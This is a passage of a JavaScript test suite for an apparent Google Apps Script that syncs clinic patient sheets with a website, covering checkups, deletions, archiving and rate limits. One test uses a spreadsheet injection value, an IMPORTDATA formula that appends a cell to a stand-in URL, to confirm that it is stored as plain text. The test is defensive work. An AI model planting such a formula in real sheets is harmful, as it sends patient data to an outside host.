  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.delete('AAJ_SYNC_SECRET');
  env.props.script.set('AAJ_SYNC_SECRET', SECRET);
  settle(env, 3);
  assert.equal(server.calls.length, 0, 'nothing is sent');
  assert.match(headerOf(env, GUL), /not set up/);
  assert.equal(env.stats.fetches, 0);
});

test('the website is down at midnight: nothing is cleared (the last rows have not reached it); the archive keeps trying until 02:30, then goes ahead and copies anyway', () => {
  const { env, server } = dayEnd();
  env.responder = () => 'OK';
  env.typeRow(GUL, 9, ['', 'Typed At Midnight', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110977', '']);
  server.faults.down = 1000;
  env.at(NEXT, '00:31');
  env.ticks(3);
  assert.equal(env.archiveBooks().length, 0, 'not archived while the last sync fails');
  assert.equal(rowOf(env, GUL, 'Typed At Midnight'), 9, 'and the rows are still on the sheet');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.tab('Aaj Sync log').values().filter((r) => /did not go through/.test(r[3])).length, 1, 'said once');
  // the website comes back at 01:10
  server.faults.down = 0;
  env.at(NEXT, '01:10');
  env.ticks(1);
  assert.equal(server.checkupsOf('GUL', TODAY).length, 1, 'the last-minute checkup reached the website for the old day');
  assert.ok(archiveSheet(env).values().some((r) => r[2] === 'Typed At Midnight'));
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  // a website that stays down past 02:30: the rows are copied anyway (they are in the archive and can be imported from there)
  const w = dayEnd();
  w.server.faults.down = 1000;
  w.env.at(NEXT, '02:31');
  w.env.ticks(1);
  assert.equal(archiveSheet(w.env).used().rows, 8);
  assert.equal(w.env.props.document.get('listDate:' + GUL), NEXT);
});

// ------------------------------------------------------------------------------------------------ checkup patients (rows with no Mr#)
const CHECKUP_ROWS = [
  ['', 'Check One', '', 'Checkup', '', 'Waiting', '', 'Dr Haniya', 'scaling advised', '', '', '03001110301', ''],
  ['', 'check two lhr', '', 'Consultation checkup', 'Kit 55k', 'Treatment', '', '', '', '', '', '', ''],
];
function ckWorld(extra = {}) {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, ...extra });
  settle(w.env, 3);
  return w;
}

test('a checkup row can be renamed or edited in the sheet: it stays the same checkup (not a new row), the website follows', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  const key = c.sheet_key;
  setCell(env, GUL, 2, 'patient', 'Zainab Uno');       // another first name: a patient row would become a new row, a checkup row is only corrected
  setCell(env, GUL, 2, 'treatment', 'Scaling');
  env.tickAfter(5000);
  assert.equal(server.state.checkups.length, 2, 'no second checkup');
  assert.equal(c.name, 'Zainab Uno');
  assert.equal(c.checkup_for, 'Scaling');
  assert.equal(c.sheet_key, key);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
  quiet(env, server);
});

test('a checkup edited on the website shows in its row; an Mr# the website gives it (registered as a patient) is written into the Mr# cell', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.editCheckup(c.id, { details: 'web details', day_status: 'completed' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 2, 'treatment details'), 'web details');
  assert.equal(cellOf(env, GUL, 2, 'waiting'), 'Completed');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '');
  // the person is registered as a patient on the website: the new Mr# comes back
  server.addPatient({ mr: '50001', name: 'Check One', phone: '03001110301' });
  server.editCheckup(c.id, { patient_mr: '50001' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50001', 'the new Mr# is written into the sheet row');
  assert.equal(env.tab(GUL).kind(2, 1), 'n');
  quiet(env, server);
  assert.equal(server.state.checkups.length, 2, 'still a checkup row: nothing was re-sent as a new patient');
  assert.equal(server.state.visits.length, 0);
  setCell(env, GUL, 2, 'treatment details', 'sheet again');
  env.tickAfter(5000);
  assert.equal(c.details, 'sheet again', 'and the row still follows the checkup');
});

test('an Mr# typed into a checkup row makes it another row (a patient row): the checkup is removed, the patient gets the visit', () => {
  const { env, server } = ckWorld();
  server.addPatient({ mr: '9810', name: 'Check One', phone: '03001110301' });
  setCell(env, GUL, 2, 'mr', '9810');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, 1);
  assert.equal(server.state.visits[0].mr, '9810');
  assert.equal(server.state.checkups.filter((x) => x.name === 'Check One').length, 0, 'the checkup of the same row went with the old key');
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
});

test('a checkup made on the website is added to the sheet as a row without an Mr#, claimed once, and follows later edits', () => {
  const { env, server } = ckWorld();
  const c = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Web Checkup', phone: '03001110302', checkup_for: 'Checkup', doctors: 'Dr Ali Rashid' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Web Checkup');
  assert.equal(r, 4, 'right below the last patient row');
  assert.equal(cellOf(env, GUL, r, 'mr'), '');
  assert.equal(env.tab(GUL).kind(r, colOf(env, GUL, 'contact')), 's');
  assert.equal(cellOf(env, GUL, r, 'contact'), '03001110302');
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Waiting');
  assert.equal(statusOf(env, GUL, r), '\u2713 Added from the website');
  env.ticks(3);
  assert.equal(env.tab(GUL).used().rows, 4, 'added once');
  assert.equal(c.sheet_key, 'W-' + c.id, 'the website claimed it');
  server.editCheckup(c.id, { checkup_for: 'Whitening' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'Whitening');
  setCell(env, GUL, r, 'treatment details', 'from the sheet');
  env.tickAfter(5000);
  assert.equal(c.details, 'from the sheet');
  setCell(env, GUL, r, 'patient', 'Zainab Web');       // renamed in the sheet: the same checkup, not a new row
  env.tickAfter(5000);
  assert.equal(c.name, 'Zainab Web');
  assert.equal(server.state.checkups.length, 3, 'no fourth checkup');
  assert.equal(c.sheet_key, 'W-' + c.id);
  quiet(env, server);
});

test('a checkup row that has just come from the website is renamed in the sheet before the next look: still the same checkup, not a new row', () => {
  const { env, server } = ckWorld();
  const c = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Web Two', phone: '03001110303', checkup_for: 'Checkup' });
  env.ticks(1);
  const r = rowOf(env, GUL, 'Web Two');
  assert.equal(statusOf(env, GUL, r), '✓ Added from the website');
  setCell(env, GUL, r, 'patient', 'Zainab Two');
  env.tickAfter(5000);
  assert.equal(c.name, 'Zainab Two');
  assert.equal(server.state.checkups.length, 3, 'no new checkup was made for the renamed row');
  assert.equal(c.sheet_key, 'W-' + c.id);
});

test('deleting a checkup row removes the checkup from the website; Ctrl+Z brings it back; a checkup that is already a patient is kept and put back', () => {
  const rows = [];
  for (let i = 0; i < 6; i++) rows.push(['', 'Check ' + (i + 1), '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0300222000' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 6);
  const sh = env.tab(GUL);
  const saved = []; for (let c = 1; c <= sh.used().cols; c++) saved.push(sh._get(2, c));
  env.deleteRows(GUL, 2);
  env.ticks(2);
  assert.equal(server.state.checkups.length, 5, 'Check 1 is gone from the website too');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Check 1 .*the checkup is removed from the website too/);
  // Ctrl+Z
  for (let rr = sh.used().rows; rr >= 2; rr--) for (let c = 1; c <= saved.length; c++) { sh._set(rr + 1, c, sh._get(rr, c)); sh._set(rr, c, null); }
  saved.forEach((cell, i) => { if (cell) sh._set(2, i + 1, cell); });
  env.touch();
  env.ticks(2);
  assert.equal(server.state.checkups.length, 6);
  assert.equal(server.state.checkups.find((x) => x.name === 'Check 1').sheet_key, sh.text(2, colOf(env, GUL, 'sync key')));
  // a registered checkup is kept
  server.addPatient({ mr: '50002', name: 'Check 2', phone: '03002220001' });
  server.editCheckup(server.state.checkups.find((x) => x.name === 'Check 2').id, { patient_mr: '50002' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Check 2'));
  env.ticks(2);
  assert.equal(server.state.checkups.length, 6, 'kept');
  const back = [...Array(10).keys()].map((i) => i + 2).find((r) => cellOf(env, GUL, r, 'patient') === 'Check 2');
  assert.ok(back, 'the row is back');
  assert.match(statusOf(env, GUL, back), /^\u26a0 Not removed: this checkup is already a patient/);
});

// ------------------------------------------------------------------------------------------------ rows deleted, kept by the website
test('a deleted row of a visit that has an invoice: the website keeps it marked Cancelled, and the row comes back showing Cancelled and why', () => {
  const { env, server } = synced();
  const v = webVisit(server, 'Sample Person Three');
  v.attached = true;
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));
  env.ticks(2);
  assert.equal(v.status, 'cancelled');
  assert.equal(server.visitById(v.id), v, 'not deleted');
  const back = rowOf(env, GUL, 'Sample Person Three');
  assert.ok(back > 5, 'the row returns');
  assert.equal(cellOf(env, GUL, back, 'waiting'), 'Cancelled');
  assert.equal(statusOf(env, GUL, back), '\u26a0 Kept on the website and marked Cancelled: it has an attached record (invoices).');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Sample Person Three .*Kept on the website and marked Cancelled/);
  quiet(env, server);
  env.ticks(2);
  assert.equal(server.state.visits.filter((x) => x.mr === '9702').length, 1, 'once');
});

test('a row deleted by a person while the sheet is being archived at night is never a removal: the nightly clear removes nothing from the website', () => {
  const { env, server } = dayEnd();
  const before = server.state.visits.length;
  env.at(NEXT, '00:05');
  env.ticks(1);                                     // final flush, copy, clear
  assert.equal(dataCells(env).length, 0);
  env.at(NEXT, '08:00');
  env.ticks(4);
  assert.equal(server.visitsOf('GUL', TODAY).length, before, 'yesterday\'s visits are all still on the website');
  assert.equal(server.state.visits.length, before);
  assert.ok(server.calls.every((c) => c.payload.date !== NEXT || c.payload.tabs.every((t) => (t.present || []).length === 0 && t.rows.length === 0)), 'the new day started with nothing to remove');
  assert.equal(server.calls.filter((c) => c.payload.date === TODAY && c.at >= Date.parse(NEXT + 'T00:00:00Z') - 5 * 3600000).every((c) => c.payload.check_removed === false), true, 'the last flush before the clear asks for no removal check');
});

// ------------------------------------------------------------------------------------------------ Mr# the website does not know
test('an Mr# the website does not know: below 50000 it is a Healthwire number (the patient is added, the row says to check it); 50000 and above is a typo (nothing is made)', () => {
  const rows = [
    ['9851', 'Kaneez Fatima', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110851', ''],
    ['50123', 'Typo Person', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110852', ''],
    ['49999', 'Edge Person', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110853', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.deepEqual(server.state.patients.map((p) => p.mr), ['9851', '49999'], 'Healthwire numbers become patients with that Mr#');
  assert.equal(statusOf(env, GUL, 2), '\u26a0 New patient added with Healthwire Mr# 9851. Check the name and phone on the website.');
  assert.equal(statusOf(env, GUL, 3), '\u2717 Mr# 50123 is not on the website. Check the number.');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Kaneez Fatima .*New patient added: Mr# 9851/);
  assert.equal(server.state.visits.length, 2);
  assert.match(headerOf(env, GUL), /3 need attention/, 'two new patients to check, one typo');
});

test('another patient\'s name is not given away when an Mr# does not fit: the row only says the Mr# belongs to somebody else', () => {
  const rows = [['9701', 'Totally Different', '', 'RCT', '', 'Waiting', '', '', '', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9701', name: 'Sample Person One', phone: '03001110001', first_branch: 'DHA' }] });
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '\u2717 Mr# 9701 belongs to another patient. Check the Mr#.');
  assert.equal(server.state.visits.length, 0);
});

// ------------------------------------------------------------------------------------------------ quiet minutes
test('a quiet minute is one question to the website and reads no sheet; after something was typed the next minute reads in full, then it is quiet again', () => {
  const { env, server } = synced();
  env.ticks(1);
  const reads = () => env.stats.calls.read || 0;
  const r0 = reads(), f0 = env.stats.fetches;
  env.ticks(3);
  assert.equal(env.stats.fetches - f0, 3, 'one question per minute');
  assert.equal(reads(), r0, 'no sheet range was read in a quiet minute');
  const last = server.calls[server.calls.length - 1].payload;
  assert.equal(last.tabs[0].rows.length, 0);
  assert.ok(!('present' in last.tabs[0]), 'no list of present rows: the website claims and removes nothing');
  assert.equal(last.check_removed, false);
  setCell(env, GUL, 2, 'treatment details', 'typed in the sheet');
  env.tickAfter(5000);
  assert.ok(reads() > r0, 'a person typed: the tabs are read in full');
  assert.equal(webVisit(server, 'Sample Person One').details, 'typed in the sheet');
  env.tickAfter(61000);
  env.ticks(1);
  const r1 = reads();
  env.ticks(2);
  assert.equal(reads(), r1, 'quiet again');
});

test('the tabs are read in full at least every five minutes even when nobody typed (a sort or a paste may not tell Google\'s triggers)', () => {
  const { env, server } = synced();
  env.ticks(1);
  env.props.document.set('fullAt', String(env.clock.ms));             // the tabs were just read in full
  const reads = () => env.stats.calls.read || 0;
  const r0 = reads();
  env.ticks(2);
  assert.equal(reads(), r0);
  const sh = env.tab(GUL);
  sh._set(2, colOf(env, GUL, 'treatment details'), { kind: 's', v: 'changed behind the trigger\'s back' });          // no on-edit, no on-change
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').details, 'U L 018 Pc', 'not noticed within two minutes');
  env.advance(5 * 60000);
  env.ticks(1);
  assert.equal(webVisit(server, 'Sample Person One').details, 'changed behind the trigger\'s back', 'noticed at the next full read');
});

test('a website change is noticed by the quiet question and the tabs are then read in full', () => {
  const { env, server } = synced();
  env.ticks(2);
  const reads = () => env.stats.calls.read || 0;
  const r0 = reads();
  server.editVisit(webVisit(server, 'Sample Person Two').id, { details: 'website news' });
  env.ticks(1);
  assert.ok(reads() > r0);
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Sample Person Two'), 'treatment details'), 'website news');
});

test('a new row that is still settling keeps the following minutes in full until it has been sent; a failed call does too', () => {
  const { env, server } = synced({ extra: [{ mr: '9801', name: 'Settle Sam', phone: '03001110801' }] });
  env.typeRow(GUL, 8, ['9801', 'Settle Sam', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.tickAfter(20000);
  env.tickAfter(30000);
  assert.equal(rowsSent(server).filter((x) => x.set.name === 'Settle Sam').length, 0, 'still settling');
  env.tickAfter(30000);
  assert.equal(rowsSent(server).filter((x) => x.set.name === 'Settle Sam').length, 1, 'sent as soon as it was quiet for 60 s, not five minutes later');
  server.faults.down = 1;
  setCell(env, GUL, 2, 'treatment details', 'while the website is down');
  env.tickAfter(5000);
  env.tickAfter(60000);
  assert.equal(webVisit(server, 'Sample Person One').details, 'while the website is down', 'the next minute tried again at once');
});

test('the run time of the edit runs counts too: "rte:" grows with every edit and the stop at 85 minutes counts both', () => {
  const { env } = synced();
  env.ticks(1);
  setCell(env, GUL, 2, 'treatment details', 'x');
  assert.ok(Number(env.props.document.get('rte:' + TODAY)) >= 0 && env.props.document.has('rte:' + TODAY), 'the edit run was counted');
  env.props.document.set('rte:' + TODAY, String(5200000));
  const f = env.stats.fetches;
  env.at(TODAY, '08:21');
  env.tick();
  assert.equal(env.stats.fetches, f, 'edits alone used up the day: the ticks stop');
  assert.equal(headerOf(env, GUL), 'Website \u00b7 paused for today (Google time limit). Use the website.');
  env.at(NEXT, '08:00');
  env.props.document.set('listDate:' + GUL, NEXT);
  env.ticks(1);
  assert.ok(!env.props.document.has('rte:' + TODAY), 'yesterday\'s counter is gone');
});

test('a website that answers BUSY three minutes in a row is shown in the headings; one busy minute is not', () => {
  const { env, server } = synced();
  const before = headerOf(env, GUL);
  server.faults.busy = true;
  env.tickAfter(60000);
  assert.equal(headerOf(env, GUL), before, 'one busy minute: nothing shown');
  env.tickAfter(60000);
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d the website is busy, trying again$/);
  server.faults.busy = false;
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
});

test('R3: the website\'s limit of 20 calls a minute (RATE_LIMIT) is a wait, like BUSY: shown as "busy, trying again" after three minutes, never as "did not answer"; then it carries on', () => {
  const { env, server } = synced();
  const rows = rowsSent(server).length;
  server.faults.rateLimit = 1000;
  env.tickAfter(60000);
  env.tickAfter(60000);
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d the website is busy, trying again$/);
  assert.ok(!/did not answer/.test(headerOf(env, GUL)));
  server.faults.rateLimit = 0;
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
  assert.equal(rowsSent(server).length, rows, 'nothing was sent twice');
});

// ------------------------------------------------------------------------------------------------ the archive: the script was off, a Google hiccup, formulas
test('the script was off all night and a row was typed this morning: the old rows go to the archive under their day, the new row stays and goes to the website as today\'s', () => {
  const { env, server } = synced({ extra: [{ mr: '9801', name: 'Morning Mary', phone: '03001110801' }] });
  env.at(TODAY, '17:00');
  env.ticks(1);
  env.at(NEXT, '08:03');                                      // the trigger was dead since 17:00
  env.typeRow(GUL, 8, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.advance(61000);
  env.ticks(1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 7, 'the six old rows and the header');
  assert.ok(!arch.values().some((r) => r.includes('Morning Mary')), 'the morning row is not archived under yesterday\'s date');
  assert.equal(rowOf(env, GUL, 'Morning Mary'), 8, 'it stays on the tab');
  assert.equal(dataCells(env).length, 1);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /1 rows typed today stay on the tab as today's patients/);
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitsOf('GUL', NEXT).length, 1, 'and it reached the website as a row of today');
  assert.equal(server.visitsOf('GUL', NEXT)[0].mr, '9801');
  assert.equal(server.visitsOf('GUL', TODAY).length, 6);
});

test('a Google hiccup while opening the archive starts no second archive: nothing is cleared and the next minute tries again; after five failed minutes a new one is made', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const id = env.props.document.get('archiveId');
  assert.equal(env.archiveBooks().length, 1);
  env.at(NEXT, '09:00');
  env.typeRow(GUL, 2, ['', 'Day Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.at('2026-10-11', '00:05');
  env.openErrors[id] = 'Exception: Service error: Spreadsheets';
  for (let i = 1; i <= 4; i++) {
    env.ticks(1);
    assert.equal(env.archiveBooks().length, 1, 'still the one archive after failure ' + i);
    assert.equal(env.props.document.get('archiveId'), id);
    assert.equal(rowOf(env, GUL, 'Day Two'), 2, 'nothing cleared');
  }
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /could not be opened right now .*Trying again next minute/);
  delete env.openErrors[id];
  env.ticks(1);
  assert.equal(env.archiveBooks().length, 1);
  assert.equal(archiveSheet(env).text(archiveSheet(env).used().rows, 3), 'Day Two', 'filed in the same archive when Google answered again');
  // five failures in a row: a new archive
  env.typeRow(GUL, 2, ['', 'Day Three', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110802', '']);
  env.at('2026-10-12', '00:05');
  env.openErrors[id] = 'Exception: Service error: Spreadsheets';
  for (let i = 0; i < 5; i++) env.ticks(1);
  assert.equal(env.archiveBooks().length, 2, 'after five failed minutes a new archive is made');
  assert.notEqual(env.props.document.get('archiveId'), id);
});

test('text that staff typed in the Website column, or in a header, is written back as text and never becomes a formula', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const wc = colOf(env, GUL, 'website');
  env.type(GUL, 3, wc, "'=IMPORTDATA(\"https://example.com/?\"&B2)");           // typed with a leading apostrophe: it shows as =IMPORTDATA(...)
  server.editVisit(webVisit(server, 'Sample Person One').id, { status: 'cancelled' });
  env.ticks(1);                                                                // another row's status changed: the whole column is written again
  assert.equal(cellOf(env, GUL, 2, 'waiting'), 'Cancelled');
  assert.equal(env.stats.formulaWrites, 0, 'nothing was written as a formula');
  assert.equal(sh.kind(3, wc), 's');
  assert.equal(sh.text(3, wc), '=IMPORTDATA("https://example.com/?"&B2)');
  // a header that looks like a formula, at the nightly copy
  sh._set(1, colOf(env, GUL, 'reminder'), { kind: 's', v: '=1+1' });
  env.at(NEXT, '00:05');
  env.ticks(1);
  assert.equal(env.stats.formulaWrites, 0);
  const arch = archiveSheet(env);
  assert.ok(arch.row(1).includes('=1+1'), 'the header is archived as text');
});

test('a row that the website says was taken off and then put back to work comes back to the sheet (the "removed" mark with a working status)', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, rows: { [GUL]: [] } });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting' });
  const w = server.addVisit({ branch: 'GUL', date: TODAY, mr: '146', status: 'cancelled' });
  const orig = env.fetchHandler;
  env.fetchHandler = (req) => {
    const r = orig(req);
    const body = JSON.parse(r.body);
    for (const t of body.tabs || []) for (const x of t.visits || []) if (x.id === v.id || x.id === w.id) x.removed = true;
    return { code: r.code, body: JSON.stringify(body) };
  };
  env.ticks(3);
  assert.ok(rowOf(env, GUL, 'Sample Person One'), 'removed mark but Waiting: the row returns');
  assert.equal(rowOf(env, GUL, 'Sample Person Two'), null, 'removed mark and Cancelled: it stays off the sheet');
});

// ------------------------------------------------------------------------------------------------ the nightly list of checkup patients ("Checkup karwaliya")
function ckDay(extra = {}) {
  const w = ckWorld(extra);
  w.env.at(TODAY, '23:58');
  w.env.ticks(1);
  w.env.at(NEXT, '00:05');
  w.env.ticks(1);
  return w;
}

test('at night the day\'s checkup patients (rows with no Mr#) are added to the checkup sheet: date, name, phone, city, clinic, doctor, treatment, status, source tab; patients with an Mr# are not', () => {
  const { env } = ckDay({ patients: BASE_PATIENTS });
  const ck = ckSheet(env);
  assert.ok(ck, 'the tab "Aj ki List checkups" was made');
  assert.deepEqual(ck.row(1), ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Sync id']);
  assert.ok(ck.hidden.has(12), 'the id column is hidden');
  assert.equal(ck.used().rows, 3, 'two checkups and the header; none of the patients with an Mr#');
  assert.match(ck.text(2, 1), /^2026-10-09T/, 'the checkup\'s day');
  assert.deepEqual(ck.row(2).slice(1, 11), ['Check One', '03001110301', 'Karachi', 'RJ Mall', 'Dr Haniya', 'Checkup', '', 'Not Contacted', 'scaling advised', 'Aj ki List - Gulshan KHI']);
  assert.equal(ck.kind(2, 3), 's', 'a phone is text: the leading 0 survives');
  assert.deepEqual(ck.row(3).slice(1, 8), ['Check Two', '', 'Karachi', 'RJ Mall', '', 'Consultation checkup', '']);
  assert.match(ck.text(2, 12), /^2026-10-09\|S-[0-9a-f]{12}$/);
  assert.equal(env.props.document.get('ckNote'), undefined);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /2 checkup patients added to "Aj ki List checkups" in the checkup list\./);
});

test('every checkup patient is added once: the same lines again add nothing; nothing in the checkup sheet is edited or deleted', () => {
  const w = ckDay({ patients: BASE_PATIENTS });
  const { env } = w;
  const ck = ckSheet(env);
  const before = JSON.stringify(ck.values());
  const lines = [
    { id: '2026-10-09|' + env.tab('Aaj Sync log').text(1, 1), date: TODAY, name: 'Not Real', phone: '', city: 'Karachi', clinic: 'RJ Mall', doctor: '', treatment: '', notes: '', source: 'x' },
  ];
  const first = env.call('aajCkWrite_', lines);
  assert.equal(first.added, 1);
  const again = env.call('aajCkWrite_', lines);
  assert.equal(again.added, 0, 'the same id is not added twice');
  const sheetLines = JSON.stringify(ck.values().slice(0, 3));
  assert.equal(sheetLines, JSON.stringify(JSON.parse(before).slice(0, 3)), 'earlier rows untouched');
  // the lines the nightly run builds are the same on a second look at the same archived rows
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env.call('aajDetectColumns', fixture.headers[GUL]) };
  const rows = [{ key: 'S-0123456789ab', cells: ['', 'Dup Check', '', 'Checkup', '', '', '', '', '', '', '', '0300 1234567', ''] }];
  assert.deepEqual(env.call('aajCheckupLines', s, rows, TODAY), env.call('aajCheckupLines', s, rows, TODAY));
  assert.equal(env.call('aajCheckupLines', s, rows, TODAY)[0].phone, '03001234567');
  assert.equal(env.call('aajCheckupLines', s, rows, TODAY)[0].id, TODAY + '|S-0123456789ab');
  assert.equal(env.call('aajCheckupLines', s, [{ key: '', cells: ['9701', 'Has Mr', '', '', '', '', '', '', '', '', '', '', ''] }], TODAY).length, 0, 'a row with an Mr# is no checkup');
  assert.equal(env.call('aajCheckupLines', s, [{ key: '', cells: ['NEW', 'Typed New', '', 'Checkup', '', '', '', '', '', '', '', '', ''] }], TODAY).length, 1, 'NEW counts as no Mr#');
});

test('a checkup tab that already exists (the owner\'s own columns, rows, order): rows are appended at the bottom, columns found by header text, only one new header cell (Sync id) is written next to the data', () => {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, checkupBook: false });
  const header = ['Notes', 'Month', 'Patient Name', 'Phone', 'Clinic', 'Status', 'Treatment / Checkup For'];
  w.env.checkupBook = w.env.addBook(CK_ID, 'Checkup karwaliya', { 'July 26': [header, ['old note', 'Jul 2026', 'Old Patient', '0300 000 0000', 'RJ Mall', 'Interested', 'Checkup'], ['', 'Jul 2026', 'Old Two', '', 'Lahore Gulberg', 'Not Contacted', '']] });
  w.env.props.script.set('CHECKUP_TAB', 'July 26');
  settle(w.env, 3);
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  const sh = w.env.checkupBook.getSheetByName('July 26');
  assert.deepEqual(sh.row(2).slice(0, 7), ['old note', 'Jul 2026', 'Old Patient', '0300 000 0000', 'RJ Mall', 'Interested', 'Checkup'], 'old rows exactly as they were');
  assert.deepEqual(sh.row(3).slice(0, 7), ['', 'Jul 2026', 'Old Two', '', 'Lahore Gulberg', 'Not Contacted', ''], 'and the second one');
  assert.equal(sh.used().rows, 5);
  assert.equal(sh.text(1, 8), 'Sync id', 'one header cell next to the last header');
  assert.deepEqual([sh.text(4, 3), sh.text(4, 4), sh.text(4, 5), sh.text(4, 6), sh.text(4, 7), sh.text(4, 1)], ['Check One', '03001110301', 'RJ Mall', 'Not Contacted', 'Checkup', 'scaling advised']);
  assert.equal(w.env.checkupBook.getSheetByName('Aj ki List checkups'), null, 'no other tab was made');
});

test('no edit access to the checkup sheet: the sync and the archive go on, the nightly list says so clearly and keeps the patients to add later; when access comes they are added', () => {
  const w = ckWorld({ patients: BASE_PATIENTS });
  const { env, server } = w;
  env.openErrors[CK_ID] = 'You do not have permission to access the requested document.';
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive and the new day went ahead');
  assert.equal(archiveSheet(env).used().rows, 3, 'the day is in the archive');
  assert.match(env.props.document.get('ckNote'), /^Checkup list not updated: the "Checkup karwaliya" sheet could not be opened \(You do not have permission to access the requested document\.\)\. Dr\. Ali's Google account needs edit access to it\.$/);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Checkup list not updated: .* 2 checkup patients are kept here and added as soon as it works\./);
  assert.ok(env.props.document.get('ckq:0'), 'the two patients wait');
  // Aaj Sync > Status says so
  env.responder = () => 'OK';
  env.ctx.aajStatus();
  const text = env.dialogs[env.dialogs.length - 1].text;
  assert.match(text, /Checkup list not updated/);
  assert.match(text, /2 checkup patients wait to be added/);
  // the sync keeps working for the new day
  env.at(NEXT, '08:00');
  server.addPatient({ mr: '9801', name: 'Morning Mary', phone: '03001110801' });
  env.typeRow(GUL, 2, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.tickAfter(61000);
  env.ticks(2);
  assert.equal(server.visitsOf('GUL', NEXT).length, 1);
  // access comes: the next try (at most every 30 minutes) adds them, once
  delete env.openErrors[CK_ID];
  env.tickAfter(31 * 60000);
  const ck = ckSheet(env);
  assert.equal(ck.used().rows, 3);
  assert.equal(env.props.document.get('ckNote'), undefined);
  assert.equal(env.props.document.get('ckq:0'), undefined);
  env.tickAfter(31 * 60000);
  assert.equal(ckSheet(env).used().rows, 3, 'not added again');
});

test('no edit access for long: no more than 300 checkup patients are kept to add later (the oldest are dropped, the log says how many)', () => {
  const { env } = ckWorld({ patients: BASE_PATIENTS });
  env.openErrors[CK_ID] = 'You do not have permission to access the requested document.';
  const st = env.ctx.aajLoadState_();
  const ctx = env.ctx.aajNewCtx_(st, false);
  const lines = [];
  for (let i = 0; i < 320; i++) lines.push({ id: TODAY + '|k' + i, date: TODAY, name: 'Waiting ' + i, phone: '', city: '', clinic: '', doctor: '', treatment: '', notes: '', source: 'x' });
  env.ctx.aajAppendCheckups_(ctx, lines);
  const kept = JSON.parse(JSON.stringify(env.ctx.aajCkLoad_(st)));
  assert.equal(kept.length, 300);
  assert.equal(kept[0].name, 'Waiting 20', 'the 20 oldest were dropped');
  assert.equal(kept[299].name, 'Waiting 319');
  env.ctx.aajFlushLog_(ctx);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /20 of the oldest checkup patients cannot be kept for later\./);
});

test('Set up tells at the end when the checkup sheet cannot be opened (everything else still works); with access it says nothing about it', () => {
